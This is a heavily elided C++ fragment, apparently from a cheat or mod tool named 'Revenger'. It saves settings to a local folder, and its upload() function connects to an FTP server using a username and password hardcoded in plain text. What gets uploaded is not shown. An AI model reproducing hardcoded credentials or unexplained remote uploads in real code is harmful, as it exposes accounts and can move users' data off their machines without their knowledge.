...
void savesets() {
	...
	if (CreateDirectory("C:/REVENGERCFG/", NULL) || ERROR_ALREADY_EXISTS == GetLastError())
	{

	}
	std::string savetype = "c:/REVENGERCFG/save";
...
void upload()
{
	...
	hFtp = InternetConnect(hInternet, "RevengerProject", INTERNET_DEFAULT_FTP_PORT, "RevengerProject@idinahui", "RevengerProject1337", INTERNET_SERVICE_FTP, 0, 0);
